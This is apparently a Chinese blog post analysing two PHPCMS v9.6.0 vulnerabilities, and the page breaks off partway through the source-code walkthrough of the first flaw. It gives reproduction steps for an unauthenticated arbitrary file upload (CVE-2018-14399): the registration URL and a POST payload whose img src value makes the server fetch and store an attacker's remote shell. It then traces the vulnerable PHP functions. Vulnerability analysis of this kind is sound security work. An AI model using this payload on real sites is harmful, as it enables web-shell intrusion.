@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="任意文件上传（CVE-2018-14399） + wap模块 SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPCMS v9.6.0 两个漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="M13n&#39;s Blog">
+<meta property="og:description" content="任意文件上传（CVE-2018-14399） + wap模块 SQL注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/gfY8KknGSrRtO7M-20201117115107490.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pMFCXVQycNb6RjU-20201117115107549.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BUloO1A9ujR256I-20201117115107256.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5XIC1okjlf2PMJQ-20201117115108205.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/nqCsx4wp8uX2MWl-20201117115107457.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/AJSbqUtg7T63PGZ-20201117115107732.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/qFr95yWlGcEsjZM-20201117115108047.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VSoJDEBZkU7Fsw8-20201117115108185.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3fuanq7rCEoSyOZ-20201117115108205.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Y36mPkxv12pZhlM-20201117115108098.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VzLkrIoPJFl15Di-20201117115108399.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5BUeGSb2Oyzhqj4-20201117115108323.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fdxGa6P3iTprsV2-20201117115108325.jpg">
+<meta property="article:published_time" content="2019-11-23T08:25:50.000Z">
+<meta property="article:modified_time" content="2021-02-11T11:59:48.568Z">
+<meta property="article:author" content="M13n">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="SQLi">
+<meta property="article:tag" content="PHPCMS">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>PHPCMS v9.6.0 两个漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHPCMS v9.6.0 两个漏洞分析&body=Check out this article: http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=PHPCMS v9.6.0 两个漏洞分析&description=&lt;p&gt;任意文件上传（CVE-2018-14399） + wap模块 SQL注入&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2018-14399%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">任意文件上传（CVE-2018-14399）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wap%E6%A8%A1%E5%9D%97-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">wap模块 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PHPCMS v9.6.0 两个漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M13n's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-23T08:25:50.000Z" itemprop="datePublished">2019-11-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PHP-Sec/">PHP Sec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/PHPCMS/" rel="tag">PHPCMS</a>, <a class="tag-link-link" href="/tags/SQLi/" rel="tag">SQLi</a>, <a class="tag-link-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>任意文件上传（CVE-2018-14399） + wap模块 SQL注入</p>
+<span id="more"></span>
+
+
+
+<h2 id="任意文件上传（CVE-2018-14399）"><a href="#任意文件上传（CVE-2018-14399）" class="headerlink" title="任意文件上传（CVE-2018-14399）"></a>任意文件上传（CVE-2018-14399）</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>漏洞危害：该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。</strong></p>
+<p>漏洞触发位置在 会员注册 这个界面。地址为 <code>ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg"></p>
+<p>POST参数如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=你的shell&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/gfY8KknGSrRtO7M-20201117115107490.jpg"></p>
+<p>访问爆出上传地址<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pMFCXVQycNb6RjU-20201117115107549.jpg"></p>
+<p>能shell</p>
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BUloO1A9ujR256I-20201117115107256.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>文件目录 <code>phpcms/modules/member/index.php</code></p>
+<p><code>index.php</code> 大致实现功能：会员前台管理中心、账号管理、收藏操作类</p>
+<p>触发漏洞点方法是 <code>register</code> 大致逻辑是 获取用户siteid，定义站点id常量，加载用户模块配置，加载短信模块配置</p>
+<p>第 134-135 行 发现可控变量 <code>$_POST[‘info’]</code> 经过漏洞复现我们可以知道这是 exp 的关键参数</p>
+<p>先看 134 行的处理，将 <code>$_POST[‘info’]</code> 这个参数经过了<code>new_html_special_chars</code>这个函数过滤。跟进函数分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回经addslashe处理过的字符串或数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $obj 需要处理的字符串或数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_html_special_chars</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$encoding</span> = <span class="string">&#x27;utf-8&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">&#x27;gbk&#x27;</span>) <span class="variable">$encoding</span> = <span class="string">&#x27;gb2312&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(!is_array(<span class="variable">$string</span>)) <span class="keyword">return</span> htmlspecialchars(<span class="variable">$string</span>,ENT_COMPAT,<span class="variable">$encoding</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) <span class="variable">$string</span>[<span class="variable">$key</span>] = new_html_special_chars(<span class="variable">$val</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要功能是做了 html 转义。对我们漏洞利用没有太大阻碍。接着跟进一下 135行的 <code>$member_input-&gt;get()</code> 方法<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5XIC1okjlf2PMJQ-20201117115108205.jpg"></p>
+<p>方法位置：<code>caches/caches_model/caches_data/member_input.class.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span> = trim_script(<span class="variable">$data</span>);</span><br><span class="line">	<span class="variable">$model_cache</span> = getcache(<span class="string">&#x27;member_model&#x27;</span>, <span class="string">&#x27;commons&#x27;</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.<span class="variable">$model_cache</span>[<span class="keyword">$this</span>-&gt;modelid][<span class="string">&#x27;tablename&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$debar_filed</span> = <span class="keyword">array</span>(<span class="string">&#x27;catid&#x27;</span>,<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;style&#x27;</span>,<span class="string">&#x27;thumb&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;islink&#x27;</span>,<span class="string">&#x27;description&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$field</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;islink&#x27;</span>]==<span class="number">1</span> &amp;&amp; !in_array(<span class="variable">$field</span>,<span class="variable">$debar_filed</span>)) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="variable">$field</span> = safe_replace(<span class="variable">$field</span>);</span><br><span class="line">			<span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">			<span class="variable">$minlength</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;minlength&#x27;</span>];</span><br><span class="line">			<span class="variable">$maxlength</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;maxlength&#x27;</span>];</span><br><span class="line">			<span class="variable">$pattern</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">			<span class="variable">$errortips</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;errortips&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$errortips</span>)) <span class="variable">$errortips</span> = <span class="string">&quot;<span class="subst">$name</span> 不符合要求！&quot;</span>;</span><br><span class="line">			<span class="variable">$length</span> = <span class="keyword">empty</span>(<span class="variable">$value</span>) ? <span class="number">0</span> : strlen(<span class="variable">$value</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$minlength</span> &amp;&amp; <span class="variable">$length</span> &lt; <span class="variable">$minlength</span> &amp;&amp; !<span class="variable">$isimport</span>) showmessage(<span class="string">&quot;<span class="subst">$name</span> 不得少于 <span class="subst">$minlength</span> 个字符！&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (!array_key_exists(<span class="variable">$field</span>, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">&#x27;模型中不存在&#x27;</span>.<span class="variable">$field</span>.<span class="string">&#x27;字段&#x27;</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$maxlength</span> &amp;&amp; <span class="variable">$length</span> &gt; <span class="variable">$maxlength</span> &amp;&amp; !<span class="variable">$isimport</span>) &#123;</span><br><span class="line">				showmessage(<span class="string">&quot;<span class="subst">$name</span> 不得超过 <span class="subst">$maxlength</span> 个字符！&quot;</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				str_cut(<span class="variable">$value</span>, <span class="variable">$maxlength</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$pattern</span> &amp;&amp; <span class="variable">$length</span> &amp;&amp; !preg_match(<span class="variable">$pattern</span>, <span class="variable">$value</span>) &amp;&amp; !<span class="variable">$isimport</span>) showmessage(<span class="variable">$errortips</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;isunique&#x27;</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="variable">$field</span>=&gt;<span class="variable">$value</span>),<span class="variable">$field</span>) &amp;&amp; ROUTE_A != <span class="string">&#x27;edit&#x27;</span>) showmessage(<span class="string">&quot;<span class="subst">$name</span> 的值不得重复！&quot;</span>);</span><br><span class="line">			<span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;formtype&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, <span class="variable">$func</span>)) <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$func</span>(<span class="variable">$field</span>, <span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">			<span class="variable">$info</span>[<span class="variable">$field</span>] = <span class="variable">$value</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先将 data 经过一个 <code>trim_script</code> 的处理。但是 <code>trim_script</code> 大多都是处理 xss 有关漏洞的过滤。几个正则将xss的关键 payload 进行了替换</p>
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/nqCsx4wp8uX2MWl-20201117115107457.png"></p>
+<p>第27行，核心 if 判断条件 <code>if(is_array($data))</code> 。我们 payload 中 <code>info[content]=&lt;img src=你的shell&gt;</code> 就是一个数组。因此继续跟进，发现将数组进行遍历，键名为<code>$field</code>，键值为<code>$value</code></p>
+<p>第30行，<code>$field</code> 进行一次 <code>safe_replace</code> 处理。主要过滤一些类似单引号，尖括号等可能产生 XSS，SQL注入的符号<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/AJSbqUtg7T63PGZ-20201117115107732.png" alt="image.png"></p>
+<p>之后经过一些注册时正常的判断逻辑代码</p>
+<p>47-48行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;formtype&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, <span class="variable">$func</span>)) <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$func</span>(<span class="variable">$field</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure>
+
+<p>先是定义了一个 <code>$func</code> ，然后下面的if语句判断方法如果存在就带入这个函数。</p>
+<p>挨个查看方法中，在 <code>editor</code> 方法中 的一句话。调用了 <code>attachment</code> 类的 <code>download</code> 函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">&#x27;content&#x27;</span>, <span class="variable">$value</span>,<span class="variable">$watermark_enable</span>);</span><br></pre></td></tr></table></figure>
+
+<p>跟进文件 <code>phpcms/libs/classes/attachment.class.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 附件下载</span></span><br><span class="line"><span class="comment">	 * Enter description here ...</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> $field 预留字段</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> $value 传入下载内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> $watermark 是否加入水印</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> $ext 下载扩展名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> $absurl 绝对路径</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> $basehref </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$value</span>,<span class="variable">$watermark</span> = <span class="string">&#x27;0&#x27;</span>,<span class="variable">$ext</span> = <span class="string">&#x27;gif|jpg|jpeg|bmp|png&#x27;</span>, <span class="variable">$absurl</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$basehref</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$image_d</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">&#x27;attachment_model&#x27;</span>);</span><br><span class="line">		<span class="variable">$upload_url</span> = pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;field = <span class="variable">$field</span>;</span><br><span class="line">		<span class="variable">$dir</span> = date(<span class="string">&#x27;Y/md/&#x27;</span>);</span><br><span class="line">		<span class="variable">$uploadpath</span> = <span class="variable">$upload_url</span>.<span class="variable">$dir</span>;</span><br><span class="line">		<span class="variable">$uploaddir</span> = <span class="keyword">$this</span>-&gt;upload_root.<span class="variable">$dir</span>;</span><br><span class="line">		<span class="variable">$string</span> = new_stripslashes(<span class="variable">$value</span>);</span><br><span class="line">		<span class="keyword">if</span>(!preg_match_all(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">		<span class="variable">$remotefileurls</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$matches</span>[<span class="number">3</span>] <span class="keyword">as</span> <span class="variable">$matche</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos(<span class="variable">$matche</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			dir_create(<span class="variable">$uploaddir</span>);</span><br><span class="line">			<span class="variable">$remotefileurls</span>[<span class="variable">$matche</span>] = <span class="keyword">$this</span>-&gt;fillurl(<span class="variable">$matche</span>, <span class="variable">$absurl</span>, <span class="variable">$basehref</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$matches</span>, <span class="variable">$string</span>);</span><br><span class="line">		<span class="variable">$remotefileurls</span> = array_unique(<span class="variable">$remotefileurls</span>);</span><br><span class="line">		<span class="variable">$oldpath</span> = <span class="variable">$newpath</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>(<span 